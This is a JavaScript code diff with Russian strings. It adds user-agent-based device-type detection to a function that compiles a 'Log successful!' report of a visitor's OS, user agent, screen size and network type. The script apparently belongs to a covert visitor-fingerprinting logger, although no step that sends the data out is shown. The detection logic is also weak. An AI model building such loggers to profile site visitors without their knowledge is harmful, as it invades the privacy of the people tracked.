@@ -17,6 +17,19 @@
             });
         }
 
+        function getDeviceType() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (/mobile/i.test(userAgent)) {
+                return "Мобильное устройство";
+            } else if (/tablet/i.test(userAgent)) {
+                return "Планшет";
+            } else if (/laptop|desktop/i.test(userAgent)) {
+                return "Компьютер";
+            } else {
+                return "Неизвестное устройство";
+            }
+        }
+
         function collectData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
 
@@ -54,7 +67,9 @@
                             logData += `├ Ядро ОС: ${navigator.platform}\n`;
                             logData += `├ Версия ОС: ${navigator.appVersion}\n`;
                             logData += `├ Имя ОС: ${navigator.userAgent}\n`;
-                            logData += `├ Тип устройства: Компьютер\n`;
+
+                            // Определяем тип устройства (мобильное, планшет, ПК)
+                            logData += `├ Тип устройства: ${getDeviceType()}\n`;
                             logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
                             logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n\n`;
 
